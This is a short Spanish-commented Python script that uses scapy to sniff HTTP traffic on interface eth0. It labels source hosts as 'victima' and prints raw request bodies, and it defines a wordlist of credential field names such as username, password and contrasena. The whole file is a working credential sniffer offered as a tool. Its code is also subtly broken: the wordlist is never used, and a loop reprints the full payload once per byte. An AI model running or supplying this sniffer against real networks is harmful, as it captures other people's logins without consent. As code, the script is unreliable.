from scapy.all import *
from scapy_http import http
from colorama import Fore, init

init()

wordlist = ["username", "user", "email",
            "usuario", "password", "passwd", "contrasena"]


def captura_http(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] victima: "+packet[IP].src + " IP DESTINO: " +
              packet[IP].dst + " DOMINIO: " + packet[http.HTTPRequest].Host)
        if packet.haslayer(Raw):
            load = packet[Raw].load
            load = load.lower()
            for e in load:
                print(Fore.LIGHTRED_EX + " DATO ENCONTRADO: " + load)


def main():
    print(
        "...[{}+{}] capturando paquetes...".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))
    sniff(iface="eth0", store=False, prn=captura_http)


if __name__ == "__main__":
    main()
